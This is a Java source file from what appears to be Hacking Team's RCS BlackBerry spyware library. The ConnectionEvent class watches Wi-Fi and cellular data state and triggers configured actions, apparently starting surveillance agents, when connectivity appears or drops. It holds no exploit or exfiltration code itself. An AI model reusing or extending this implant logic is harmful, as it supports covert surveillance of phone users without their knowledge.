//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ConnectionEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.RadioListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.WLANConnectionListener;
import net.rim.device.api.system.WLANInfo;
import net.rim.device.api.system.WLANListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.Status;
import blackberry.action.StartAgentAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class ConnectionEvent.
 */
public final class ConnectionEvent extends Event implements
        WLANConnectionListener, RadioStatusListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConnectionEvent",
            DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    /**
     * Instantiates a new connection event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public ConnectionEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_CONNECTION, actionId, confParams, "ConnectionEvent");
    }

    protected void actualStart() {
        Application.getApplication().addRadioListener(this);
        WLANInfo.addListener(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        // TODO Auto-generated method stub

    }

    protected void actualStop() {
        Application.getApplication().removeRadioListener(this);
        WLANInfo.removeListener(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();
        } catch (final EOFException e) {
            return false;
        }
        return true;
    }

    public synchronized void networkConnected() {
        boolean wifi = true;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug
                .trace("networkConnected  wifi: " + wifi + " gprs: "
                        + status.gprs);
        //#endif

        if (status.testAndSetWifi(wifi)!=wifi) {
            // cambiamento di stato
            if (!status.gprs) {
                trigger(actionOnEnter);
            }
        }
    }

    public synchronized void networkDisconnected(int reason) {
        boolean wifi = false;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug
                .trace("networkConnected  wifi: " + wifi + " gprs: "
                        + status.gprs);
        //#endif

        if (status.testAndSetWifi(wifi)!=wifi) {
            // cambiamento di stato
            if (!status.gprs) {
                trigger(actionOnExit);
            }
        }
    }

    public void baseStationChange() {
    }

    public void networkScanComplete(boolean success) {
    }

    public synchronized void networkServiceChange(int networkId, int service) {
        // state 0, spento
        // service = 1030 acceso

        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug.trace("networkServiceChange  wifi: " + status.wifi + " gprs: "
                + gprs);
        //#endif

        if (status.testAndSetGprs(gprs)!=gprs) {
            // cambiamento di stato
            if (!status.wifi) {
                if (gprs) {
                    trigger(actionOnEnter);
                } else {
                    trigger(actionOnExit);
                }
            }
        }
    }

    public void networkStarted(int networkId, int service) {
        // TODO Auto-generated method stub
    }

    public void networkStateChange(int state) {
        //gprs = state == GPRSInfo.GPRS_STATE_READY;
        //#ifdef DEBUG
        //debug.trace("networkStateChange  wlan: " + wlan + " gprs: " + gprs);
        //#endif

    }

    public synchronized void pdpStateChange(int apn, int state, int cause) {
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        Status status = Status.getInstance();

        //#ifdef DEBUG
        debug.trace("pdpStateChange  wifi: " + status.wifi + " gprs: "
                + gprs);
        //#endif

        if (status.testAndSetGprs(gprs)!=gprs) {
            // cambiamento di stato
            if (!status.wifi) {
                if (gprs) {
                    trigger(actionOnEnter);
                } else {
                    trigger(actionOnExit);
                }
            }
        }
    }

    public void radioTurnedOff() {
        // TODO Auto-generated method stub

    }

    public void signalLevel(int level) {
        // TODO Auto-generated method stub

    }

}
